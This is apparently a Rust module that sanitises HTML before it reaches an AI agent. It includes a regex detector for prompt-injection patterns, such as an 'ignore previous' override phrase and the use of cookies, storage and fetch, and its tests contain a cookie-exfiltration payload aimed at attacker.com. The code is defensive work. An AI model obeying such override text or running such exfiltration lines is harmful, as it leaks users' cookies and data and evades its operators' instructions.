use regex::Regex;
use std::sync::OnceLock;

/// Clean HTML page ready for the agent context window.
pub struct SanitizedPage {
    /// Clean HTML safe for the agent context window.
    pub clean_html: String,
    /// All JavaScript extracted from `<script>` tags (for separate analysis).
    pub extracted_scripts: Vec<String>,
    /// SHA-256 hex digest of the original raw HTML.
    pub raw_html_hash: String,
}

/// Sanitises raw HTML and extracts inline scripts.
pub fn sanitize_html(raw_html: &str) -> SanitizedPage {
    // Extract script content before stripping
    static SCRIPT_RE: OnceLock<Regex> = OnceLock::new();
    let script_re = SCRIPT_RE.get_or_init(|| {
        Regex::new(r"(?si)<script[^>]*>(.*?)</script>").unwrap()
    });
    let extracted_scripts: Vec<String> = script_re
        .captures_iter(raw_html)
        .map(|cap| cap[1].trim().to_string())
        .filter(|s| !s.is_empty())
        .collect();

    // SHA-256 of the raw input for audit / dataset use
    let raw_html_hash = sha256_hex(raw_html.as_bytes());

    // Build ammonia builder with strict allowlist
    let clean_html = ammonia::Builder::default()
        // Allow only safe structural and text tags
        .tags(std::collections::HashSet::from([
            "a", "p", "div", "span", "h1", "h2", "h3", "h4", "h5", "h6",
            "ul", "ol", "li", "table", "thead", "tbody", "tr", "th", "td",
            "strong", "em", "b", "i", "code", "pre", "blockquote",
            "img", "br", "hr",
        ]))
        // Disallow all event handler attributes and javascript: hrefs
        .clean_content_tags(std::collections::HashSet::from(["script", "style", "iframe", "object", "embed"]))
        .url_schemes(std::collections::HashSet::from(["https", "http"]))
        .clean(raw_html)
        .to_string();

    SanitizedPage { clean_html, extracted_scripts, raw_html_hash }
}

/// Checks whether a JavaScript string contains patterns typical of prompt injection.
/// Returns a list of suspicious patterns found (empty = clean).
pub fn detect_js_injection_patterns(js: &str) -> Vec<String> {
    let patterns: &[(&str, &str)] = &[
        (r"(?i)ignore.{0,30}(previous|prior|above)",  "instruction override attempt"),
        (r"(?i)system\s*prompt",                       "system prompt reference"),
        (r"(?i)(exfiltrate|send.{0,20}data|leak)",     "data exfiltration language"),
        (r"(?i)fetch\s*\(",                            "fetch() call"),
        (r"(?i)new\s+WebSocket\s*\(",                  "WebSocket instantiation"),
        (r"(?i)document\.cookie",                      "cookie access"),
        (r"(?i)localStorage|sessionStorage",            "storage access"),
        (r"(?i)navigator\.sendBeacon",                 "sendBeacon call"),
    ];

    let mut found = vec![];
    for (pattern, label) in patterns {
        if Regex::new(pattern)
            .map(|re| re.is_match(js))
            .unwrap_or(false)
        {
            found.push(label.to_string());
        }
    }
    found
}

/// SHA-256 of arbitrary bytes, returned as a hex string.
pub fn sha256_hex(data: &[u8]) -> String {
    use sha2::{Digest, Sha256};
    let hash = Sha256::digest(data);
    hex::encode(hash)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn strips_script_tags() {
        let html = "<p>Hello</p><script>alert('xss')</script>";
        let result = sanitize_html(html);
        assert!(!result.clean_html.contains("<script"));
        assert!(!result.clean_html.contains("alert"));
        assert!(result.clean_html.contains("Hello"));
    }

    #[test]
    fn extracts_inline_scripts() {
        let html = "<p>x</p><script>var x = 1;</script><script>var y = 2;</script>";
        let result = sanitize_html(html);
        assert_eq!(result.extracted_scripts.len(), 2);
    }

    #[test]
    fn strips_event_handlers() {
        let html = r#"<p onclick="steal()">click me</p>"#;
        let result = sanitize_html(html);
        assert!(!result.clean_html.contains("onclick"));
    }

    #[test]
    fn detects_fetch_in_js() {
        let js = "fetch('https://attacker.com?data='+document.cookie)";
        let patterns = detect_js_injection_patterns(js);
        assert!(!patterns.is_empty());
        assert!(patterns.iter().any(|p| p.contains("fetch")));
    }

    #[test]
    fn clean_js_passes() {
        let js = "const x = document.querySelector('h1').textContent;";
        let patterns = detect_js_injection_patterns(js);
        assert!(patterns.is_empty());
    }
}
